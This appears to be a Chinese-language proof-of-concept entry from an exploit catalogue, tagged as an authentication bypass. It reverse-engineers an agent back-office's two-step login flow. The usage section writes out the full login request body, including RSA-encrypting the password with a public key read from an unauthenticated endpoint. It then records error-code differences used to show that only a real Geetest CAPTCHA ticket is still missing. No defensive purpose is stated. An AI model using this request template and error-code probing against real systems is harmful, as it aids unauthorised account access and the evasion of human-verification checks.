# 代理后台 loginFlow 两步验证流程完全逆向（isValidate/checkCode/XCode/XCodeId），卡点精确定位为极验票据

- **code**: 代理后台-loginflow-两步验证流程完全逆向-isvalidate-checkcode-xcode-xcodeid-卡点精确定位为极验票据
- **kind**: poc
- **category**: auth-bypass
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com:6507 实测：①从前端 chunk 逆出 loginFlow 的两步验证 body 结构（isValidate/checkCode/XCode/XCodeId/loginDeviceNo）；②口令经 RSA-2048/PKCS1v1.5 加密，公钥取自未鉴权接口 getRsaPublicKey，脚本可正常构造；③用错误码差异做对照实验——不加 isValidate 返回「请输入验证码！」，加上 isValidate=1+checkCode 返回「极验验证过期，请重新登录尝试」，证明服务端逐层识别且流程结构还原正确；④前端另证实错误码 6020 代表极验验证失败并触发重试倒计时。结论：两步流程完全可复现，唯一缺口为极验票据的真实值。
- **tags**: 登录流程,极验,两步验证,代理后台,错误码差异
- **created_at**: 2026-10-03T02:34:40.431Z
- **found_by**: exploit

## 描述

完全逆向代理后台 loginFlow 的两步验证流程（图形码换checkCode → checkCode换会话），并用错误码差异精确定位卡点为极验票据

## 用法

```
python agent_two_step.py
# 完整 body（已验证服务端逐层识别）：
{
  "userName": "<账号>",
  "password": "<RSA2048(md5(明文)) base64>",       # 公钥接口未鉴权可读
  "confirmPassword": "<同上>",
  "userPassword": "<RSA2048(md5(代理初始密码))>",
  "confirmUserPassword": "<同上>",
  "loginDeviceNo": "<设备号>",
  # 第二步验证字段（关键）：
  "isValidate": 1,          # 标记进入验证阶段
  "checkCode": "<短信/邮件验证码>",
  "XCode": "<极验返回>", "XCodeId": "<极验返回>"
}
# 错误码判据（实测）：
#   无 isValidate            -> 6008「请输入验证码！」      ← 未进入验证阶段
#   isValidate=1 checkCode=0 -> 6008「极验验证过期，请重新登录尝试」 ← 已进入验证阶段，票据无效
#   服务端错误码 6020 = 极验验证码错误（前端据此触发倒计时重试）
# ⇒ 两步流程已完全还原，服务端逐层识别；唯一缺口是极验票据真实值（需一次真实人机交互）
```
